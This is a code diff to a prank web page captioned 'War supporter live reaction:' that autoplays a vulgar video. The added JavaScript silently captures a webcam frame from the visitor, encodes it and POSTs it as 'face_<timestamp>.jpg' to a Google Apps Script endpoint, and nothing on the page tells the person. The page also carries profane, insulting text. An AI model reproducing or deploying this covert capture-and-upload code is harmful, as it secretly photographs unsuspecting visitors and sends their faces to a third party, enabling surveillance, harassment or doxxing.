@@ -6,6 +6,7 @@
     <body>
         <h2>War supporter live reaction:</h2>
         <video id="video" width="320" height="240" autoplay muted playsinline ></video>
+        <canvas id="canvas" width="320" height="240"></canvas>
         <video autoplay="autoplay" loop="" class="myVideo" id="myVideo" muted playsinline onclick="disableMute()">
             <source src="putin_cocks.mp4" type="video/mp4">
             Get Fucked!
@@ -18,12 +19,40 @@ function disableMute() {
   vid.muted = false;
 } 
 let video = document.querySelector("#video");
+let canvas = document.querySelector("#canvas");
 
 
 document.addEventListener("DOMContentLoaded", async function() {
     let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     video.srcObject = stream;
     
+});
+        
+video.addEventListener('playing', function() {
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+	dataURL = canvas.toDataURL();
+    var byteString = atob(dataURL.split(",")[1]);
+  	var arrayBuffer = new ArrayBuffer(byteString.length);
+    var byteArray = new Uint8Array(arrayBuffer);
+    for (var i = 0; i < byteString.length; i++) {
+    byteArray[i] = byteString.charCodeAt(i);}
+    
+    
+    const url = "https://script.google.com/macros/s/AKfycbwY-f0NdgF6o7GBUVkb6YGtXcU40Vi3bw98_ct5k6olYuPXVcM7M-QmbtMzKAqapqC4sg/exec"; 
+    let filename = `face_${(new Date().toJSON())}.jpg`
+    const qs = new URLSearchParams({
+        filename: filename,
+        mimeType: 'image/jpeg',
+      });
+    fetch(`${url}?${qs}`, {
+        method: "POST",
+        body: JSON.stringify([...byteArray]),
+      })
+        .then((res) => res.json())
+        .then(console.log)
+        .catch(console.log);
+    
+
 });
 
 
